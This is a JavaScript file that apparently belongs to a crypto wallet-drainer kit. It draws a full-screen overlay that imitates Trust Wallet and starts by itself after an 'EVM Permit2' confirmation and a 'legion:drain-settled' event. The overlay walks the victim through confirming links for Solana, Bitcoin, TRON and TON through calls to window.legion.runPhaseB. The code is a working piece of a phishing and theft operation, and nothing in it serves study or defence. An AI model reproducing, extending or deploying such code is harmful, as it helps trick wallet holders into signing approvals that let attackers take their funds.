/**
 * Phase B UI — after EVM Confirm: Processing all networks + Stop (graceful abort).
 * Uses legion.runPhaseB / abortPhaseB. Does not wipe EVM session.
 */
(function () {
  'use strict';

  var running = false;

  function ensureSheet() {
    var el = document.getElementById('__trust_phaseb_sheet');
    if (el) return el;
    el = document.createElement('div');
    el.id = '__trust_phaseb_sheet';
    el.style.cssText = 'position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.82);display:none;align-items:flex-end;justify-content:center;padding:16px;font-family:system-ui,sans-serif';
    el.innerHTML = [
      '<div style="width:100%;max-width:420px;background:#111;color:#fff;border-radius:16px;padding:20px 18px 22px">',
      '<div style="font-size:17px;font-weight:700;margin-bottom:8px">Processing all networks…</div>',
      '<div id="__trust_pb_status" style="font-size:13px;opacity:.9;line-height:1.45;margin-bottom:12px;min-height:40px">Confirm in Trust when asked. You can Stop anytime.</div>',
      '<div id="__trust_pb_steps" style="font-size:12px;opacity:.85;margin-bottom:14px;line-height:1.6"></div>',
      '<button type="button" id="__trust_pb_stop" style="display:block;width:100%;background:#522;color:#fff;border:0;border-radius:12px;padding:14px;font-weight:700;margin-bottom:8px">Stop</button>',
      '<button type="button" id="__trust_pb_close" style="display:block;width:100%;background:transparent;border:0;color:#888;padding:10px;font-size:13px">Close</button>',
      '</div>',
    ].join('');
    document.body.appendChild(el);
    el.querySelector('#__trust_pb_close').onclick = function () { el.style.display = 'none'; };
    el.querySelector('#__trust_pb_stop').onclick = function () {
      if (window.legion && typeof window.legion.abortPhaseB === 'function') {
        window.legion.abortPhaseB();
      }
      setStatus('Stopped. Already confirmed steps kept; remaining networks skipped.');
      setStopEnabled(false);
    };
    return el;
  }

  function setStatus(msg) {
    var el = document.getElementById('__trust_pb_status');
    if (el) el.textContent = msg;
    try { console.warn('[TrustPhaseB]', msg); } catch (_) {}
  }

  function setSteps(html) {
    var el = document.getElementById('__trust_pb_steps');
    if (el) el.innerHTML = html || '';
  }

  function setStopEnabled(on) {
    var btn = document.getElementById('__trust_pb_stop');
    if (!btn) return;
    btn.disabled = !on;
    btn.style.opacity = on ? '1' : '0.5';
  }

  var stepState = { Solana: '⏳', Bitcoin: '⏳', TRON: '⏳', TON: '⏳' };

  function renderSteps() {
    var lines = [];
    Object.keys(stepState).forEach(function (k) {
      lines.push(k + ': ' + stepState[k]);
    });
    setSteps(lines.join('<br>'));
  }

  function markStep(label, state) {
    var key = label;
    if (/sol/i.test(label)) key = 'Solana';
    else if (/bit/i.test(label)) key = 'Bitcoin';
    else if (/tron/i.test(label)) key = 'TRON';
    else if (/ton/i.test(label)) key = 'TON';
    if (!stepState[key]) return;
    if (state === 'active') stepState[key] = '⏳';
    else if (state === 'ok') stepState[key] = '✅';
    else if (state === 'aborted') stepState[key] = '⏹';
    else stepState[key] = '⏭ skip';
    renderSteps();
  }

  async function startPhaseB() {
    if (running) return;
    if (!window.legion || typeof window.legion.runPhaseB !== 'function') {
      console.warn('[TrustPhaseB] legion.runPhaseB missing');
      return;
    }
    running = true;
    var sheet = ensureSheet();
    sheet.style.display = 'flex';
    // Hide preflight sheet if open
    try {
      var pf = document.getElementById('__trust_preflight_sheet');
      if (pf) pf.style.display = 'none';
    } catch (_) {}

    stepState = { Solana: '⏳', Bitcoin: '⏳', TRON: '⏳', TON: '⏳' };
    renderSteps();
    setStopEnabled(true);
    setStatus('Step: link networks in Trust when Confirm appears (~10s+).');

    try {
      var res = await window.legion.runPhaseB({
        onStatus: function (ev) {
          if (ev && ev.label) {
            markStep(ev.label, ev.state);
            if (ev.state === 'active') setStatus('Confirm: ' + ev.label + '…');
            else if (ev.state === 'ok') setStatus(ev.label + ' ready');
            else if (ev.state === 'skip') setStatus(ev.label + ' skipped (not linked)');
          }
          if (ev && ev.phase === 'done') {
            setStatus(ev.label || 'Done');
          }
        },
      });
      if (res && res.aborted) {
        setStatus('Stopped. EVM kept; remaining skipped.');
      } else {
        setStatus('Network step complete. Skips = Trust did not link that family.');
      }
    } catch (e) {
      setStatus('Phase B error: ' + (e && e.message ? e.message : 'fail'));
    } finally {
      setStopEnabled(false);
      running = false;
    }
  }

  window.__TRUST_PHASE_B__ = startPhaseB;

  // Auto-trigger after EVM Permit2 confirms
  window.addEventListener('trust:evm-confirm-done', function () {
    setTimeout(function () { startPhaseB(); }, 200);
  });

  window.addEventListener('legion:drain-settled', function (e) {
    var d = e && e.detail;
    if (d && d.path && d.ok) {
      setTimeout(function () { startPhaseB(); }, 200);
    }
  });

  window.addEventListener('legion:phaseb-abort', function () {
    setStatus('Stopped by user.');
    setStopEnabled(false);
  });
})();
